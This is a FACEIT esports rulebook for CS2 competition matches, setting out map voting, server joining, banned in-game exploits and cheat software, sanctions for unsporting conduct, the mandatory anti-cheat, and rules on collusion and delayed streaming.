GAME SETTINGS

Game Version

All Matches played on FACEIT will use the latest version of CS2. If a Player’s game is not up to date and the Player attempts to join the Server, the Player will not be allowed to join.

Players’ Settings

External tools or software to alter in-game settings are not allowed in FACEIT Matches.

Map Selection

Each player will be asked to remove maps from the map pool until one map is left.

MATCH PROCEDURE

Before the Match Start

Map Voting Process

Players have a total of five (5) minutes to vote, if a player uses more than the allowed time, they will be disqualified from the competition. Each vote is a maximum of fifteen (15) seconds.

Play Button/Ip Notification

Once this button appears, the player has five (5) minutes to join the Server. Players can join the Server by clicking on the “PLAY” button or copying the “connect server-ip” command into their CS2 console.

During a Match

  • Communication: All communication with Competition Admins is expected to be in English. All communication in-game and on the website is also recommended to be in English.

  • Match Interrupted: If a Match is involuntarily interrupted (player crash, server crash, network cuts,…) the Competition Admin may decide to resume the Match to a round before the issue was present to give both players a fair chance.

RULES AND VIOLATIONS

Forbidden In-Game Actions

The following actions are strictly prohibited during a Match and may result in a Player’s account being suspended:

  • Any form of external script is forbidden.
  • Usage of any agents is also forbidden.
  • Using bugs that change the game principle (i.e. spawn bugs) is illegal.
  • Moving through walls, floors and roofs is strictly forbidden. This also includes skywalking.
  • “Map swimming” or “Floating” is illegal.
  • “Pixelwalking” is illegal (sitting or standing on invisible map edges).
  • HE/Flash/smoke throw script
  • All 3rd party software that is not allowed by the game publisher or FACEIT and that can give an unfair advantage to a player or team is classed as cheating.

Sanctions

Issues during a Match from the beginning of the Match to the end must be reported right away and cannot be reported after the fact, as this constitutes acceptance of the issue by the opposing player. A Player may be cautioned and receive a ban if the Player commits any of the following offences:

  • Refuses to follow Competition Admin instructions.
  • Shows dissent by word or action towards other Players.
  • Uses insulting language and/or gestures towards other Players.
  • Is guilty of unsporting behaviour in a Match.
  • Griefing/Trolling
  • Ghosting
  • Spamming
  • Mislead or dupe any Competition Admins

OTHER

Anti-Cheat

All Players must download and use the FACEIT Anti-Cheat in order to participate in the competition.

If a Player is detected by the Anti-Cheat, the Player will be removed from the Match and their account will be suspended.

In-Game Name/Avatars

In-Game Names/Avatars may not contain any offensive or discriminatory content. If Players come across a Player breaking this rule then they must submit a ticket with relevant evidence (screenshot/recording), so action can be taken against the Player in question.

Collusion/Match-Fixing

Any form of collusion or match-fixing in order to manipulate the results in this competition will result in disqualification and potentially a permanent ban from FACEIT.

Streaming

Players are allowed to stream their own Matches via a POV stream. POV Streaming requires a stream delay of at least 90 seconds.

FINALITY OF DECISION MAKING

FACEIT and its Officials reserve the right to make all final decisions regarding competition matters.
